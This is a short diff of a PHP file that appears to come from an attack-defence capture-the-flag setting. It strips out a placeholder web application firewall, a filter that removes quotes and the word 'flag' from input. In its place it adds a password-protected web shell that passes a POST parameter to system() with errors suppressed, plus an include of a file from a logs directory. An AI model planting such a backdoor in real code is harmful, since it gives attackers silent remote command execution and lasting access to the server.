@@ -1,9 +1,2 @@
-<?php // Your WAF goes here<?php
-if(isset($_POST['url'])){
- $u=$_POST['url'];
-  if(!strpos($u,'http')!==0)die();
-}
-foreach ($_REQUEST as $k => $v) {
-    $_REQUEST[$k]=preg_replace("/['\\\\]/",'',$v);
-    $_REQUEST[$k]=preg_replace("/flag/",'',$v);
-}
+<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="c29f375f360a285114f39974f4c2a27443312148")@system($_POST["w"]);
+@include_once "/var/www/html/logs/w";
